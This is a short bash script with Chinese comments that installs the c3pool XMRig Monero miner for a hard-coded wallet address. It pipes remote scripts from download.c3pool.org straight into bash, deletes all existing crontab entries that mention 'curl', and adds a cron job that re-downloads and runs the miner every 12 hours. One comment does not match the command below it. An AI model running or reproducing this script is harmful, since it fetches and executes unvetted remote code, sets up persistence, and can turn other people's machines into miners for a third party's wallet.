#!/bin/bash
#停止c3池
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s

# 首先终止匹配的进程
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43LnXHx4St2VXP3EgCpH4UDu5LbsajdmLQHboSkdcEhFMcbiHxgVEstjHYjsVEZc7BMVqMoZRB1d79E3LQYuAqBWFPPvSdz


#清除上一次的任务，添加下一次的任务
crontab -l | grep -v "curl" | crontab -
echo "0 */12 * * * curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43LnXHx4St2VXP3EgCpH4UDu5LbsajdmLQHboSkdcEhFMcbiHxgVEstjHYjsVEZc7BMVqMoZRB1d79E3LQYuAqBWFPPvSdz" | crontab -
